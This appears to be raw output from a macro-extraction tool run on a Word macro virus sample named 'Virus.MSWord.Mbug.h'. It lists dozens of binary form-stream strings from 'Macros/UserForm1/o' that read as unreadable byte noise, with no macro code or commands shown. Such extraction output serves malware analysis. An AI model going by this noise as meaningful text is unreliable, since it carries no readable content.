- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!))%9JJRai~991)%91)BJJRgZsk^gkkcckk^giiqk^gcck[Zl)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%9B9J^RcJJRPZmJJRBBRJJRJJRJ9RBBR9)9?9WcZk������������������sZc))!9)99)93.D$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"~[[����RBJB/V99J1)B'&D#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
='&D1)B999999999F-=9999)9B9BJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBOGGJBBJBBJBBB9BB9B9)9BBRXe���ʦ��}��]i�9I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^!1k%-s!1k!1k##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`##X!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1)BJBBJBBDDT���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JcRk9)9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%99)9[ZlJBB199999JBJcRkiiqiiqgZsccccckk^ggZsJJR3.+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!))%91)B19999JB9JJBJBBR199BBRBBRJJRJ9RJJZ��ܴ����������ܴ����ҧ�RBB
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9+)�AK�`b�a[~JBBB9J99J1)B1)B!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B<.<999B9B9)9F-=999B9BJBBB9BB9BJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBB9B1)B19JLY����ƫͦ��dt�LY�.3~GF�LY�9I�)Bo'1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)BJBJJBB99J;+;���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9B=k^Rc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)1)BJJZZKU199B9BBBRJJRk^giiqcckcZkccccZk[ZlJJR<.<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
))!))!))%9)!))%99)93#)3.D1-X3.DB9JBBR>FX^Rc������������ܴ�ܴ�ܴ���ɹ��3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"~1?�{{Җ~�3=TJ9BB9B99J1)B'&D!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)%91)B9)9B9B9)99)9J9BB9BB9BJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBB9B1)B1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=99{���̹����dt�Xe�dt�dt�K[�K[�5:k)Bo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)9919)9<.<991+#+���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Nt_�JBB
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)%9JBJPZmB9B9)9JJRZKUcckk^gcckgZs[Zlcckk^gJJR1)B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2)%9)%9$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2')-$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2')-$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
23#)..91)BB9JJJRum�ҧ�ܴ�ܴ�ܴ�ܴ�ܴ�ܴ�������{qi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z&-�`bǙ��cZkJBB9)9>FX1)B'&D#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B)%91)B9)9B9BB9BB9BB9BJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBB9B99J1)B1)B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B%)o������~��ew�}��xw�dt�fs�K[�9I�5:k19c##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%91)B1991993#)3#)50-���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)'1YkkF-=)!))!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)9)9[ZlJJR3.DJ9RJJR^Rccckcck^RccZkk^g[ZlJJR3.D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%9)!))!))!))!))!))!)$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
23#))!))%919999JJJR���ܴ�ܴ�ܴ�ܴ�ܴ�ܴ�ܴ����������3=T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c##XGF�+)�xw���㰧�R9BB9BJBB99J1)B1)B'&D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2)%91)B9)9<.<B9BB9BJBBB9BJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBB9B1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^xw����~��~��~��}��ew�fs�fs�K[�9I�5:k'1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)9993#)3#))!)3#)5%+���

3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9B=kk^gOGG999991')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
21)BJBJNPTBBRBBRJJRPZmeYVcRk[ZlcckcckkVcJJR3.D!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))%93#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
21)BJBB�mn�~�~������ҧ�ҧ�ܴ�������������[[�$3�1E�N]�`b�iu�޸�ܴ�RBJJBBB9BB9B1)B'&D#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B')-1)B9)9999B9BB9BB9BJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBOGGJBBJBBJBBJBBJBBJBB99J)%91-X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B%-sXe�~�ϛ�Ǜ�ǝ��~��xw�dt�ai~9I�)Bo.3~'1Y!1k!1k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B9B)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)3#)3#)))!3.+5%+���

3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9LHkkVcN?V9993#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%9JBJ[ZlJJRJJZJJZ[Zl^Rc[Zl^Rcccc[ZlcckPZm3.D991
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!))!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)1%19)9ZKUsZc���ܴ���������⮩�xw���ۣ�ధʵ��������kVcBB9B9JB9B99J'&D'&D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!9)%91)B9999)9<.<B9BB9BJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBBBRB9B1)B1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!N.3~Xe�xw������֝��~��]i�1E�K[�K[�9I�LY�)5k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^%)o.3~1E�#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)XFmk^gJBB
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)3#)3#))!)5%+���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!NcZkkVcJ9R3.+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)9)9ccccZkNPTJJRcRk^RccckcRk[ZlcZkcck^RcJBB)%9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))!))!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1)B^Rc���ܴ���������⣟ࣟൡ�ӻ����������w9)9B9B99J1)B'&D#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B)!)1)B999999B9BB9BB9BJBBB9BJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBOGGJBBJBBJBJ1)B3.D1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D##X%-sK[�~��~��~��Xe�K[�Xe�K[�fs�K[�1E�FV�iu�Rcs
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9cZk{�)!))!)3#)3#)3.+5%+���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)1-XcZkZKU9)9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)1)B^Rciiqk^gJJR^RckVc[ZlcckcZk[Zl^RccckJJR1)B!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!')-!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!9)9eYV�~���ܴ������⁉�TZ�dt�iu͵�����������JBBB9B99J#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
='&D'&D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B999999B9BB9BB9BJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBB99J99J1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BGF�{{�~��ew�dt�K[�dt�dt�ew�iu͞�֝��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2')-)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3.+)!)3#)3#)5%+���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
19FcxcsJJR3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)1)BJJRcckZKUkVcPZm^RcgZsJJRZKUcck^Rc^RcJBJ..9)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)')-$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2)%93#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!=-1ZKU����������⦛�%-s.D�9L�Xe�~�ϣ�����ӻ�ZKUB9BB9B1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B)!)1)B9999)9B9BB9BB9BJBBJBBJBBJBBOGGOGGJBBJBBJBBOGGJBBJBBJBBJBBJBBJBBJBBJBBJBBB9B1)B1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1%-sew�iu�xw�~��ew�~��{{�µ覛�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
21)B)%9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)3#)3.+3#)3#)3#)5%+���

3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9LHkkkB9J')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!..999JJ9R[Zl^Rccckcck[ZlcccNPT[Zl[ZlJJR99J3#)$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3#)JJR�o�������BMk!1k+)�&-�9L�~��~�ϵ�����^Rc99999J1)B'&D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)!)1)B9)9999B9BB9BB9BJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBOGGJBBJBBJBBJBBJBBJBBJBB99J1)B1-X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!N9I�dt�~����ޛ��~��3=T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2)%999JBBRBBR999=-13#)3#)3#))!)3#)5%+���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BLHkk^gJBB
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)B9B3=T[Zlcckiiqcck[ZlJJRJJRgZskVcJJR999)%9)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))!))!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n%-sTZ�~�ϔ�ޮ��^RcB9B99J1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B)%91)B9)99999)9B9BJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBOGGJBBB9BB9B1)B1-X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91-XLY�5:k'&D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))!))%91)B99JBBRJBB999=-13#)3#)3#))!)3#)50-���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BLHk^Rc999)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
